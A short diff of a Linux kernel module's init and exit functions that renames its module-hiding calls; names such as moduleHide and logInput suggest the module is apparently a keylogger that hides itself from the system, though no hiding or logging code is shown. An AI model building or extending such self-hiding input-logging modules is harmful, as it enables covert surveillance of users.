@@ -23,7 +23,7 @@ static int __init main_init(void) {
 	if (error) return error;
 
 #ifndef NOHIDE
-	error = moduleHide_init();
+	error = moduleHide_start();
 	if (error) return error;
 #endif
 
@@ -34,7 +34,7 @@ static int __init main_init(void) {
 static void __exit main_exit(void) {
 	
 #ifndef NOHIDE
-	moduleHide_exit();
+	moduleHide_stop();
 #endif
 	logInput_exit();
 	outputDevice_exit();
